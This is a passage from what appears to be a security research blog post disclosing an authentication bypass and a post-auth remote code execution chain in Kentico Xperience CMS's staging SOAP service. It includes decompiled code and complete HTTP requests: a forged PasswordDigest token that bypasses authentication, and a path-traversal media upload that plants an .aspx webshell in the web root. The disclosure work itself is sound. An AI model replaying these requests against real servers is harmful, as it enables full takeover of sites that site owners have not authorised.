// [2]\n    usernameToken.SetAuthenticatedPassword(text);\n}\n</code></pre><p>The overall algorithm is pretty straightforward. There are two crucial steps:</p><p>At , the code calls  and it returns the  string. It should be equal to the user's valid password.</p><p>At , the  is called. It will compare the string from  with the password string provided in the SOAP header.</p><p>The  is overridden by Kentico’s , and the fun starts here.</p><pre><code>protected override string AuthenticateToken(UsernameToken token)\n{\n    if (token == null)\n    {\n        throw new ArgumentNullException(\"[WebServiceAuthorization.AuthenticateToken]: Missing username authentication token.\");\n    }\n    AbstractStockHelper&lt;RequestStockHelper&gt;.Add(\"AUTH_PROCESSED\", true, false);\n    string value = SettingsKeyInfoProvider.GetValue(SiteContext.CurrentSiteName + \".CMSStagingServiceUsername\"); // [1]\n    string text = EncryptionHelper.DecryptData(SettingsKeyInfoProvider.GetValue(SiteContext.CurrentSiteName + \".CMSStagingServicePassword\")); // [2]\n    if (string.IsNullOrEmpty(text))\n    {\n        throw new SecurityException(\"[WebServiceAuthorization.AuthenticateToken]: Staging does not work with blank password. Set a password on the target server.\");\n    }\n    if (value == token.Username) // [3]\n    {\n        return StagingTaskRunner.GetSHA1Hash(text); // [4]\n    }\n    return \"\"; // [5]\n}\n\n</code></pre><p>At , the code retrieves the  for the Staging Service (from the configuration).</p><p>At , it retrieves the password for the configured user (also from the configuration).</p><p>At , it verifies if the attacker-provided username (delivered through the SOAP request) matches the configured username.</p><ul><li>If yes, it will return a SHA1 hash of a password at .</li><li><strong>If not, it will return an empty string at .</strong></li></ul><p>In simple terms, this sounds fairly unbelievable - if you provide an improper (ie, non-existent) username, the method will return an empty password. What if we tried to just deliver an empty password to bypass authentication?</p><p>Well, we of course, tried - and the result is as follows:</p><pre><code>&lt;faultstring&gt;An invalid security token was provided ---&amp;gt; The incoming Username token must contain password if the password option is set to be SendPlainText.&lt;/faultstring&gt;\n</code></pre><p>As we discovered, there is a validation method in the WSE3 library which will throw an exception when we deliver an empty password. Perhaps you could possibly try different encoding and other tricks to smuggle an empty password - who knows?</p><p>As part of onboarding at watchTowr, the importance of raccoon memes is highlighted and this little bud set the mood.</p><p>Taking the raccoon’s words to heart, we decided to look around a little bit more (before inevitably overcomplicating things).</p><p>There's still one more method to check: .</p><pre><code>protected virtual void VerifyPassword(UsernameToken token, string authenticatedPassword)\n{\n    //...\n    case PasswordOption.SendHashed:\n        this.VerifyHashedPassword(token, authenticatedPassword);\n        return;\n    case PasswordOption.SendPlainText:\n        this.VerifyPlainTextPassword(token, authenticatedPassword);\n        break;\n    default:\n        return;\n    }\n}\n</code></pre><p>You might notice that we have two different password verification types available:</p><ul></ul><p>This looks promising. While we may not be able to deliver an empty password, a hash of an empty string is likely a feasible option.</p><p>Does Kentico CMS enforce the -based verification, you ask? Nope.</p><p>This function is delegated to the WSE3 library, and it operates strictly on the attacker-controlled XML. It is enough to switch the  attribute of  tag from  to , just like this:</p><pre><code>POST /CMSPages/Staging/SyncServer.asmx HTTP/1.1\nHost: hostname\nContent-Type: text/xml; charset=utf-8\nContent-Length: 973\nSOAPAction: \"&lt;http://localhost/SyncWebService/SyncServer/ProcessSynchronizationTaskData&gt;\"\n\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;soap:Envelope xmlns:xsi=\"&lt;http://www.w3.org/2001/XMLSchema-instance&gt;\" xmlns:xsd=\"&lt;http://www.w3.org/2001/XMLSchema&gt;\" xmlns:soap=\"&lt;http://schemas.xmlsoap.org/soap/envelope/&gt;\"&gt;\n  &lt;soap:Header&gt;\n    &lt;wsse:Security xmlns:wsse=\"&lt;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd&gt;\" xmlns:wsu=\"&lt;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd&gt;\"&gt;\n      &lt;wsse:UsernameToken&gt;\n        &lt;wsse:Username&gt;watchTowr&lt;/wsse:Username&gt;\n        &lt;wsse:Password Type=\"&lt;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordDigest&gt;\"&gt;watchTowr-something-watchTowr&lt;/wsse:Password&gt;\n      &lt;/wsse:UsernameToken&gt;\n    &lt;/wsse:Security&gt;\n  &lt;/soap:Header&gt;\n  &lt;soap:Body&gt;\n    &lt;ProcessSynchronizationTaskData xmlns=\"&lt;http://localhost/SyncWebService/SyncServer&gt;\"&gt;\n      &lt;stagingTaskData&gt;watchTowr&lt;/stagingTaskData&gt;\n    &lt;/ProcessSynchronizationTaskData&gt;\n  &lt;/soap:Body&gt;\n&lt;/soap:Envelope&gt;\n</code></pre><p>and just like that, you are able to force the use of hash-based password verification!</p><p>How can we deliver a hashed password, then? It's all described in <a href=\"https://docs.oasis-open.org/wss/v1.1/wss-v1.1-spec-pr-UsernameTokenProfile-01.htm?ref=labs.watchtowr.com#_Toc104276211\">this standard</a>. It’s very dry, and hard to read, so reviewing the code was easier:</p><pre><code>public static byte[] ComputePasswordDigest(byte[] nonce, DateTime created, string secret)\n{\n\tif (nonce == null || nonce.Length == 0)\n\t{\n\t\tthrow new ArgumentNullException(\"nonce\");\n\t}\n\tif (secret == null)\n\t{\n\t\tthrow new ArgumentNullException(\"secret\");\n\t}\n\tbyte[] bytes = Encoding.UTF8.GetBytes(XmlConvert.ToString(created.ToUniversalTime(), \"yyyy-MM-ddTHH:mm:ssZ\"));\n\tbyte[] bytes2 = Encoding.UTF8.GetBytes(secret);\n\tbyte[] array = new byte[nonce.Length + bytes.Length + bytes2.Length];\n\tArray.Copy(nonce, array, nonce.Length);\n\tArray.Copy(bytes, 0, array, nonce.Length, bytes.Length);\n\tArray.Copy(bytes2, 0, array, nonce.Length + bytes.Length, bytes2.Length);\n\treturn UsernameToken.Hash(array);\n}\n</code></pre><p>In the SOAP header, 4 items are required:</p><ul><li>Timestamp, in the following format: </li></ul><p>The hash calculation is as simple as this:</p><p><code>sha1(nonce + timestamp + password)</code></p><p>Looks almost alright, as long as the  is a real secret.</p><p>As we eluded to previously, in reality with our new ‘return an empty string’ issue, the calculation can be simplified to this when you provide an invalid username:</p><p>As we control both the  and the , we can craft a valid authentication token!</p><p>This happens because the custom  returned an empty string instead of throwing an exception for an invalid username. Unfortunately, it seems Kentico overlooked the possibility of selecting a hash-based password verification mode.</p><p>Nevertheless, here is a sample HTTP Request that bypasses authentication:</p><pre><code>POST /CMSPages/Staging/SyncServer.asmx HTTP/1.1\nHost: hostname\nContent-Type: text/xml; charset=utf-8\nContent-Length: 1055\nSOAPAction: \"&lt;http://localhost/SyncWebService/SyncServer/ProcessSynchronizationTaskData&gt;\"\n\n&lt;soap:Envelope xmlns:xsi=\"&lt;http://www.w3.org/2001/XMLSchema-instance&gt;\" xmlns:xsd=\"&lt;http://www.w3.org/2001/XMLSchema&gt;\" xmlns:soap=\"&lt;http://schemas.xmlsoap.org/soap/envelope/&gt;\"&gt;\n  &lt;soap:Header&gt;\n    &lt;wsse:Security xmlns:wsse=\"&lt;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd&gt;\" xmlns:wsu=\"&lt;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd&gt;\"&gt;\n      &lt;wsse:UsernameToken&gt;\n        &lt;wsse:Username&gt;watchTowr&lt;/wsse:Username&gt;\n        &lt;wsse:Password Type=\"&lt;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordDigest&gt;\"&gt;OZ/c8o7h3mtigow7HXu0f+BUgLk=&lt;/wsse:Password&gt;\n        &lt;wsse:Nonce&gt;MTIzNDU2Nzg5MDEyMzQ1Njc4OTAxMjM=&lt;/wsse:Nonce&gt;\n        &lt;wsu:Created&gt;2025-01-01T03:34:56Z&lt;/wsu:Created&gt;\n      &lt;/wsse:UsernameToken&gt;\n    &lt;/wsse:Security&gt;\n  &lt;/soap:Header&gt;\n  &lt;soap:Body&gt;\n    &lt;ProcessSynchronizationTaskData xmlns=\"&lt;http://localhost/SyncWebService/SyncServer&gt;\"&gt;\n      &lt;stagingTaskData&gt;watchTowr&lt;/stagingTaskData&gt;\n    &lt;/ProcessSynchronizationTaskData&gt;\n  &lt;/soap:Body&gt;\n&lt;/soap:Envelope&gt;\n</code></pre><p>Yes, it’s 2025, and we are looking at the type of Authentication Bypass we’d expect to have found in the 90s (or, so we’re told).</p><h3>WT-2025-0007: Post-Auth Remote Code Execution</h3><p>Leveraging this Authentication Bypass, we now have full administrative access to Kentico’s Staging SOAP API.</p><p>In fact, better - we have access with  rights . In simple terms, this means that our work until this point has allowed us to demonstrate an ability to gain full control over the Kentico Xperience CMS.</p><p>While you could look for intrusive ways to achieve the RCE at this point (configuration changes, etc.), this is not the level of recklessness and cowboy-esque behavior clients expect of watchTowr.</p><p>Therefore, we decided to look for something more elegant though, and as you have likely already guessed - found a vulnerability within an authenticated API that allowed this.</p><p>Let’s verify what happens in the <code>ProcessSynchronizationTaskData</code> method:</p><pre><code>[WebMethod(MessageName = \"ProcessSynchronizationTaskData\")]\npublic virtual string ProcessSynchronizationTaskData(string stagingTaskData)\n{\n    string text = this.CheckStagingFeature(); // [1]\n    if (!string.IsNullOrEmpty(text))\n    {\n        return text;\n    }\n    StagingTaskData stagingTaskData2 = StagingTaskDataSoapSerializer.Deserialize(stagingTaskData); // [2]\n    text = SyncServer.CheckVersion(stagingTaskData2);\n    if (!string.IsNullOrEmpty(text))\n    {\n        return text;\n    }\n    return this.ProcessSynchronizationTaskInternal(stagingTaskData2); // [3]\n}\n</code></pre><p>At , some basic checks are performed (like a license check and authentication-related checks that we’ve already fulfilled).</p><p>At , the  based deserialization is performed. It is hardened though and it allows to deserialize several types only. It can be seen that the output is expected to be of  type.</p><p>At , the deserialized object is passed to the <code>ProcessSynchronizationTaskInternal</code>.</p><p>The tl;dr is that by leveraging our Authentication Bypass, we are now able to execute synchronization functions and tasks.</p><p>This alone is a huge and complex functionality, and it took several hours to connect all the puzzle pieces. Documentation remained elusive, and thus it was all about laborious code reading.</p><p>To be completely fair, mere mortals are not supposed to interact with this API at all - rather, it is designed to be used internally between Kentico instances.</p><p>Regardless, let’s focus on the critical details for the sanity of all readers and to ensure that we get to the exciting part of today’s blogpost.</p><p>Let’s start with a sample HTTP Request that contains serialized  object fragment (some parts were removed for readability):</p><pre><code>POST /CMSPages/Staging/SyncServer.asmx HTTP/1.1\nHost: hostname\nContent-Type: text/xml; charset=utf-8\nContent-Length: 6129\nSOAPAction: \"&lt;http://localhost/SyncWebService/SyncServer/ProcessSynchronizationTaskData&gt;\"\n\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;soap:Envelope xmlns:xsi=\"&lt;http://www.w3.org/2001/XMLSchema-instance&gt;\" xmlns:xsd=\"&lt;http://www.w3.org/2001/XMLSchema&gt;\" xmlns:soap=\"&lt;http://schemas.xmlsoap.org/soap/envelope/&gt;\"&gt;\n&lt;soap:Header&gt;\n &lt;wsse:Security xmlns:wsse=\"&lt;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd&gt;\" xmlns:wsu=\"&lt;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd&gt;\"&gt;\n    &lt;wsse:UsernameToken&gt;\n        &lt;wsse:Username&gt;watchTowr&lt;/wsse:Username&gt;\n        &lt;wsse:Password Type=\"&lt;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordDigest&gt;\"&gt;OZ/c8o7h3mtigow7HXu0f+BUgLk=&lt;/wsse:Password&gt;\n        &lt;wsse:Nonce&gt;MTIzNDU2Nzg5MDEyMzQ1Njc4OTAxMjM=&lt;/wsse:Nonce&gt;\n        &lt;wsu:Created&gt;2025-01-01T03:34:56Z&lt;/wsu:Created&gt;\n    &lt;/wsse:UsernameToken&gt;\n  &lt;/wsse:Security&gt;\n&lt;/soap:Header&gt;\n  &lt;soap:Body&gt;\n    &lt;ProcessSynchronizationTaskData xmlns=\"&lt;http://localhost/SyncWebService/SyncServer&gt;\"&gt;\n      &lt;stagingTaskData&gt;\n        &lt;![CDATA[\n            &lt;SOAP-ENV:Envelope xmlns:xsi=\"&lt;http://www.w3.org/2001/XMLSchema-instance&gt;\" xmlns:xsd=\"&lt;http://www.w3.org/2001/XMLSchema&gt;\" xmlns:SOAP-ENC=\"&lt;http://schemas.xmlsoap.org/soap/encoding/&gt;\" xmlns:SOAP-ENV=\"&lt;http://schemas.xmlsoap.org/soap/envelope/&gt;\" xmlns:clr=\"&lt;http://schemas.microsoft.com/soap/encoding/clr/1.0&gt;\" SOAP-ENV:encodingStyle=\"&lt;http://schemas.xmlsoap.org/soap/encoding/&gt;\"&gt;\n                &lt;SOAP-ENV:Body&gt;\n                    &lt;a1:StagingTaskData id=\"ref-1\" xmlns:a1=\"&lt;http://schemas.microsoft.com/clr/nsassem/CMS.Synchronization/CMS.Synchronization%2C%20Version%3D13.0.13.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3D834b12a258f213f9&gt;\"&gt;\n                    &lt;mSystemVersion xsi:null=\"1\"/&gt;\n                    &lt;mTaskGroups xsi:null=\"1\"/&gt;\n                    &lt;_x003C_TaskType_x003E_k__BackingField&gt;CreateObject&lt;/_x003C_TaskType_x003E_k__BackingField&gt; \n                    &lt;_x003C_TaskObjectType_x003E_k__BackingField id=\"ref-4\"&gt;media.file&lt;/_x003C_TaskObjectType_x003E_k__BackingField&gt;\n                    &lt;_x003C_TaskServers_x003E_k__BackingField id=\"ref-8\"&gt;127.0.0.1&lt;/_x003C_TaskServers_x003E_k__BackingField&gt;\n                    &lt;_x003C_TaskData_x003E_k__BackingField id=\"ref-7\"&gt;&lt;![CDATA[\n                            &lt;NewDataSet&gt;\n                                &lt;ObjectTranslation&gt;\n                                    &lt;ClassName&gt;media_library&lt;/ClassName&gt;\n                                    &lt;ID&gt;1&lt;/ID&gt;\n                                    &lt;CodeName&gt;Graphics&lt;/CodeName&gt;\n                                    &lt;SiteName&gt;DancingGoatCore&lt;/SiteName&gt;\n                                    &lt;ParentID&gt;0&lt;/ParentID&gt;\n                                    &lt;GroupID&gt;0&lt;/GroupID&gt;\n                                    &lt;ObjectType&gt;media.library&lt;/ObjectType&gt;\n                                &lt;/ObjectTranslation&gt;\n                                &lt;Media_File&gt;\n                                    &lt;FileID&gt;1&lt;/FileID&gt;\n                                    &lt;FileName&gt;watchTowrPoc&lt;/FileName&gt;\n                                    &lt;FileTitle&gt;poc2&lt;/FileTitle&gt;\n                                    &lt;FileDescription&gt;watchTowr&lt;/FileDescription&gt;\n                                    &lt;FileExtension&gt;.png&lt;/FileExtension&gt;\n                                    &lt;FileMimeType&gt;application/octet-stream&lt;/FileMimeType&gt;\n                                    &lt;FilePath&gt;path/&lt;/FilePath&gt;\n                                    &lt;FileSize&gt;20&lt;/FileSize&gt;\n                                    &lt;FileGUID&gt;993e29f9-086b-4110-872f-5cff26968a7b&lt;/FileGUID&gt;\n                                    &lt;FileLibraryID&gt;1&lt;/FileLibraryID&gt;\n                                    &lt;FileSiteID&gt;1&lt;/FileSiteID&gt;\n                                    &lt;FileCreatedByUserID&gt;1&lt;/FileCreatedByUserID&gt;\n                                    &lt;FileModifiedByUserID&gt;1&lt;/FileModifiedByUserID&gt;\n                                &lt;/Media_File&gt;\n                            &lt;/NewDataSet&gt;]]]]&gt;&lt;![CDATA[&gt;&lt;/_x003C_TaskData_x003E_k__BackingField&gt;\n                    &lt;_x003C_TaskBinaryData_x003E_k__BackingField id=\"ref-5\"&gt;&lt;![CDATA[&lt;BinaryData&gt;\n                                &lt;FileName&gt;watchTowrz.aspx&lt;/FileName&gt;\n                                &lt;FileType&gt;default&lt;/FileType&gt;\n                                &lt;FileBinaryData&gt;cG9j&lt;/FileBinaryData&gt;&lt;/BinaryData&gt;]]]]&gt;&lt;![CDATA[&gt;&lt;/_x003C_TaskBinaryData_x003E_k__BackingField&gt;\n                        &lt;_x003C_TaskServers_x003E_k__BackingField xsi:null=\"1\"/&gt;\n                        &lt;!-- removed for readability --&gt;\n                    &lt;/a1:StagingTaskData&gt;\n                &lt;/SOAP-ENV:Body&gt;\n            &lt;/SOAP-ENV:Envelope&gt;\n    ]]&gt;&lt;/stagingTaskData&gt;\n    &lt;/ProcessSynchronizationTaskData&gt;\n  &lt;/soap:Body&gt;\n&lt;/soap:Envelope&gt;\n</code></pre><p>The above example request, and sample XML, contains several very important parts (with some elements snipped for brevity):</p><ul><li> - defines type of the task that we want to perform. Here, we’re executing the  task.</li><li> - type of the object that we want to use during the task execution. Here, we set it to .</li><li> - which contains XML defining the task. In this scenario, it consists of two important parts (number of parts may be different, depending on the task type and object type):<ul><li> definition - enables the task to map the Library ID to the existing Media Library.</li><li> - this part defines the  object.</li></ul></li><li> - defines a binary task data, which is optional for majority of tasks. It is relevant for the task we are performing (creation of ) though.</li></ul><p>At some point, the code path in question will reach the  method, which will retrieve data from the deserialized  object:</p><pre><code> protected virtual ICMSObject ProcessTaskInternal(StagingTaskData stagingTaskData, bool processChildren, StagingSynchronizationHandler handler)\n{\n    ICMSObject result = null;\n    using (SynchronizationActionContext synchronizationActionContext = new SynchronizationActionContext())\n    {\n        UserInfo userInfo = this.TryGetUserSynchronizator(stagingTaskData.UserGuid, stagingTaskData.UserName);\n        synchronizationActionContext.LogUserWithTask = (userInfo != null);\n        synchronizationActionContext.TaskGroups = SyncManager.GetTaskGroupsFromSentTasks(stagingTaskData.TaskGroups);\n        using (new CMSActionContext(userInfo ?? this.AdministratorUser) // [1]\n        {\n            UseGlobalAdminContext = true\n        })\n        {\n            if (string.IsNullOrEmpty(stagingTaskData.TaskData))\n            {\n                throw new InvalidOperationException(\"Missing task data.\");\n            }\n            DataSet dataSetInternal = this.GetDataSetInternal(stagingTaskData.TaskData, stagingTaskData.TaskType, stagingTaskData.TaskObjectType); // [2]\n            DataSet physicalFilesDataSet = this.GetPhysicalFilesDataSet(stagingTaskData.TaskBinaryData); // [3]\n            using (CMSActionContext cmsactionContext2 = new CMSActionContext())\n            {\n                //...\n                //...\n</code></pre><p>At , the code sets the user context. Our Authentication Bypass gives us  permissions.</p><p>At , the code retrieves  dataset, which is based on the  delivered in the serialized XML.</p><p>At , the code retrieves  dataset, which is based on the  delivered in the serialized XML.</p><p>Finally, we reach a critical portion of the the  statement:</p><pre><code>switch (stagingTaskData.TaskType) // [1]\n{\n\tcase TaskTypeEnum.UpdateDocument:\n\tcase TaskTypeEnum.CreateDocument:\n\t    this.UpdateDocument(dataSetInternal, text, processChildren);\n\t    if (DataHelper.GetIntValue(dataSetInternal.Tables[text].Rows[0], \"StepType\", 1) == 101)\n\t    {\n\t        this.ArchiveDocument(dataSetInternal, text);\n\t        goto IL_3CB;\n\t    }\n\t    goto IL_3CB;\n\tcase TaskTypeEnum.PublishDocument:\n\t    if (DataHelper.DataSourceIsEmpty(dataSetInternal.Tables[\"CMS_VersionHistory\"]))\n\t    {\n\t        this.UpdateDocument(dataSetInternal, text, processChildren);\n\t        goto IL_3CB;\n\t    }\n\t    this.PublishDocument(dataSetInternal, text);\n\t    goto IL_3CB;\n\tcase TaskTypeEnum.DeleteDocument:\n\t    this.DeleteDocument(dataSetInternal, false, text);\n\t    goto IL_3CB;\n\tcase TaskTypeEnum.DeleteAllCultures:\n\t    this.DeleteDocument(dataSetInternal, true, text);\n\t    goto IL_3CB;\n\tcase TaskTypeEnum.MoveDocument:\n\t    this.MoveDocument(dataSetInternal, text);\n\t    goto IL_3CB;\n\tcase TaskTypeEnum.ArchiveDocument:\n\t    this.ArchiveDocument(dataSetInternal, text);\n\t    goto IL_3CB;\n\tcase TaskTypeEnum.UpdateObject:\n\tcase TaskTypeEnum.CreateObject: // [2]\n\t    using (CMSActionContext cmsactionContext3 = new CMSActionContext())\n\t    {\n\t        cmsactionContext3.LogSynchronization = false;\n\t        cmsactionContext3.CreateVersion = false;\n\t        cmsactionContext3.UpdateTimeStamp = false;\n\t        cmsactionContext3.UpdateSystemFields = false;\n\t        result = this.UpdateObject(dataSetInternal, physicalFilesDataSet, stagingTaskData.TaskObjectType, null, processChildren, false, true); // [3]\n\t        goto IL_3CB;\n\t    }\n\t    break;\n\tcase TaskTypeEnum.DeleteObject:\n\t    break;\n\tcase TaskTypeEnum.RejectDocument:\n\t    //...\n\t    //...\n</code></pre><p>Depending on the  defined in our XML, we can execute different actions. It’s enough to look at the task types, to realize that this API really gives you a full control over CMS page.</p><ul></ul><p>It is important here that we highlight that “objects” are a very powerful concept in Kentico. Almost everything seem to be an “object” - whether it be a media file, configuration setting. Tl;dr hundreds of object types exist.</p><p>For everyone’s sake, we are going to speedrun through the next section as UpdateObject is fairly dry.</p><p>You may remember that we’ve set the  to , which translates to creating a new media file.</p><p>When we update the  object through the  method, the  method is eventually called:</p><pre><code>private string CheckAndEnsureFilePath(string siteName, string libraryFolder, string librarySubFolderPath, string fileName, string fileExtension, bool ensureUniqueFileName, out string filePath)\n{\n    string mediaLibraryFolderPath = MediaLibraryInfoProvider.GetMediaLibraryFolderPath(siteName, libraryFolder, null); // [1]\n    if (string.IsNullOrEmpty(mediaLibraryFolderPath))\n    {\n        throw new Exception(\"[MediaFileInfoProvider.CheckAndEnsureFilePath]: Physical library path doesn't exist.\");\n    }\n    string text = mediaLibraryFolderPath;\n    librarySubFolderPath = ((librarySubFolderPath != null) ? librarySubFolderPath.TrimStart(new char[]\n    {\n        CMS.IO.Path.DirectorySeparatorChar\n    }) : null);\n    if (!string.IsNullOrEmpty(librarySubFolderPath))\n    {\n        text = DirectoryHelper.CombinePath(new string[]\n        {\n            mediaLibraryFolderPath,\n            librarySubFolderPath\n        }); // [2]\n    }\n    if (!DirectoryHelper.CheckPermissions(text))\n    {\n        throw new PermissionException(string.Format(\"[MediaFileInfoProvider.CheckAndEnsureFilePath]: Access to the path '{0}' is denied.\", mediaLibraryFolderPath));\n    }\n    filePath = DirectoryHelper.CombinePath(new string[]\n    {\n        text,\n        fileName\n    }) + fileExtension; // [3]\n    if (ensureUniqueFileName)\n    {\n        filePath = MediaLibraryHelper.EnsureUniqueFileName(filePath);\n    }\n    string fileName2 = CMS.IO.Path.GetFileName(filePath);\n    string path = (librarySubFolderPath != string.Empty) ? DirectoryHelper.CombinePath(new string[]\n    {\n        librarySubFolderPath,\n        fileName2\n    }) : fileName2;\n    DirectoryHelper.EnsureDiskPath(filePath, MediaLibraryHelper.GetMediaRootFolderPath(siteName, null));\n    return CMS.IO.Path.EnsureForwardSlashes(path, false);\n}\n</code></pre><p>At , the code will retrieve a physical (filesystem) path for the media upload directory.</p><p>At , the code will append the path from , with the attacker-controlled  ( tag from our XML payload is being used to set the  argument).</p><p>At , the attacker provided file name and extension (not validated, sanitized, etc) are appended to the file path.</p><p> is the problem, and the root cause of our Remote Code Execution vulnerability - <strong> isn’t verified against path traversal sequences, allowing an attacker to exploit a trivial path traversal here to write a file to an arbitrary location of our choice</strong>. Please note that the path traversal can also be exploited at .</p><p>With all of the above, we are in a position to upload a webshell for our RCE end boss, needing only to slightly modify our  and  definitions:</p><pre><code>POST /CMSPages/Staging/SyncServer.asmx HTTP/1.1\nHost: hostname\nContent-Type: text/xml; charset=utf-8\nContent-Length: 6152\nSOAPAction: \"&lt;http://localhost/SyncWebService/SyncServer/ProcessSynchronizationTaskData&gt;\"\n\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;soap:Envelope xmlns:xsi=\"&lt;http://www.w3.org/2001/XMLSchema-instance&gt;\" xmlns:xsd=\"&lt;http://www.w3.org/2001/XMLSchema&gt;\" xmlns:soap=\"&lt;http://schemas.xmlsoap.org/soap/envelope/&gt;\"&gt;\n  &lt;soap:Header&gt;\n    &lt;wsse:Security xmlns:wsse=\"&lt;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd&gt;\" xmlns:wsu=\"&lt;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd&gt;\"&gt;\n      &lt;wsse:UsernameToken&gt;\n        &lt;wsse:Username&gt;watchTowr&lt;/wsse:Username&gt;\n        &lt;wsse:Password Type=\"&lt;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordDigest&gt;\"&gt;OZ/c8o7h3mtigow7HXu0f+BUgLk=&lt;/wsse:Password&gt;\n        &lt;wsse:Nonce&gt;MTIzNDU2Nzg5MDEyMzQ1Njc4OTAxMjM=&lt;/wsse:Nonce&gt;\n        &lt;wsu:Created&gt;2025-01-01T03:34:56Z&lt;/wsu:Created&gt;\n      &lt;/wsse:UsernameToken&gt;\n    &lt;/wsse:Security&gt;\n  &lt;/soap:Header&gt;\n  &lt;soap:Body&gt;\n    &lt;ProcessSynchronizationTaskData xmlns=\"&lt;http://localhost/SyncWebService/SyncServer&gt;\"&gt;\n      &lt;stagingTaskData&gt;\n        &lt;![CDATA[\n            &lt;SOAP-ENV:Envelope xmlns:xsi=\"&lt;http://www.w3.org/2001/XMLSchema-instance&gt;\" xmlns:xsd=\"&lt;http://www.w3.org/2001/XMLSchema&gt;\" xmlns:SOAP-ENC=\"&lt;http://schemas.xmlsoap.org/soap/encoding/&gt;\" xmlns:SOAP-ENV=\"&lt;http://schemas.xmlsoap.org/soap/envelope/&gt;\" xmlns:clr=\"&lt;http://schemas.microsoft.com/soap/encoding/clr/1.0&gt;\" SOAP-ENV:encodingStyle=\"&lt;http://schemas.xmlsoap.org/soap/encoding/&gt;\"&gt;\n                &lt;SOAP-ENV:Body&gt;\n                    &lt;a1:StagingTaskData id=\"ref-1\" xmlns:a1=\"&lt;http://schemas.microsoft.com/clr/nsassem/CMS.Synchronization/CMS.Synchronization%2C%20Version%3D13.0.13.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3D834b12a258f213f9&gt;\"&gt;\n                    &lt;mSystemVersion xsi:null=\"1\"/&gt;\n                    &lt;mTaskGroups xsi:null=\"1\"/&gt;\n                    &lt;_x003C_TaskType_x003E_k__BackingField&gt;CreateObject&lt;/_x003C_TaskType_x003E_k__BackingField&gt; \n                    &lt;_x003C_TaskObjectType_x003E_k__BackingField id=\"ref-4\"&gt;media.file&lt;/_x003C_TaskObjectType_x003E_k__BackingField&gt;\n                    &lt;_x003C_TaskServers_x003E_k__BackingField id=\"ref-8\"&gt;127.0.0.1&lt;/_x003C_TaskServers_x003E_k__BackingField&gt;\n                    &lt;_x003C_TaskData_x003E_k__BackingField id=\"ref-7\"&gt;&lt;![CDATA[\n                            &lt;NewDataSet&gt;\n                                &lt;ObjectTranslation&gt;\n                                    &lt;ClassName&gt;media_library&lt;/ClassName&gt;\n                                    &lt;ID&gt;1&lt;/ID&gt;\n                                    &lt;CodeName&gt;Graphics&lt;/CodeName&gt;\n                                    &lt;SiteName&gt;DancingGoatCore&lt;/SiteName&gt;\n                                    &lt;ParentID&gt;0&lt;/ParentID&gt;\n                                    &lt;GroupID&gt;0&lt;/GroupID&gt;\n                                    &lt;ObjectType&gt;media.library&lt;/ObjectType&gt;\n                                &lt;/ObjectTranslation&gt;\n                                &lt;Media_File&gt;\n                                    &lt;FileID&gt;1&lt;/FileID&gt;\n                                    &lt;FileName&gt;watchTowrPoc&lt;/FileName&gt;\n                                    &lt;FileTitle&gt;poc2&lt;/FileTitle&gt;\n                                    &lt;FileDescription&gt;watchTowr&lt;/FileDescription&gt;\n                                    &lt;FileExtension&gt;.aspx&lt;/FileExtension&gt;\n                                    &lt;FileMimeType&gt;application/octet-stream&lt;/FileMimeType&gt;\n                                    &lt;FilePath&gt;../../../../../../../../inetpub/wwwroot/Kentico13/CMS/CMSPages/&lt;/FilePath&gt;\n                                    &lt;FileSize&gt;20&lt;/FileSize&gt;\n                                    &lt;FileGUID&gt;993e29f9-086b-4110-872f-5cff26968a7b&lt;/FileGUID&gt;\n                                    &lt;FileLibraryID&gt;1&lt;/FileLibraryID&gt;\n                                    &lt;FileSiteID&gt;1&lt;/FileSiteID&gt;\n                                    &lt;FileCreatedByUserID&gt;1&lt;/FileCreatedByUserID&gt;\n                                    &lt;FileModifiedByUserID&gt;1&lt;/FileModifiedByUserID&gt;\n                                &lt;/Media_File&gt;\n                            &lt;/NewDataSet&gt;]]]]&gt;&lt;![CDATA[&gt;&lt;/_x003C_TaskData_x003E_k__BackingField&gt;\n                    &lt;_x003C_TaskBinaryData_x003E_k__BackingField id=\"ref-5\"&gt;&lt;![CDATA[&lt;BinaryData&gt;\n                                &lt;FileName&gt;watchTowrz.aspx&lt;/FileName&gt;\n                                &lt;FileType&gt;default&lt;/FileType&gt;\n                                &lt;FileBinaryData&gt;base64encoded-webshell-content&lt;/FileBinaryData&gt;&lt;/BinaryData&gt;]]]]&gt;&lt;![CDATA[&gt;&lt;/_x003C_TaskBinaryData_x003E_k__BackingField&gt;\n                        &lt;_x003C_TaskServers_x003E_k__BackingField xsi:null=\"1\"/&gt;\n                        &lt;!-- removed for readability --&gt;\n                    &lt;/a1:StagingTaskData&gt;\n                &lt;/SOAP-ENV:Body&gt;\n            &lt;/SOAP-ENV:Envelope&gt;\n    ]]&gt;&lt;/stagingTaskData&gt;\n    &lt;/ProcessSynchronizationTaskData&gt;\n  &lt;/soap:Body&gt;\n&lt;/soap:Envelope&gt;\n</code></pre><p>One may realize that we have shown a  definition in the first XML.</p><p>Kentico allows users to create something called a \"Media Library\". These libraries are supposed to store a group of media files. If you want to upload a media file, you need to point the upload process to some existing media library.</p><p>When we exploit this vulnerability, we also need to point our upload request to an existing media library, which is why  is needed. However, this is not a complex task when you are an admin - and it should be noted that even if you are not able to enumerate an existing library (which should be 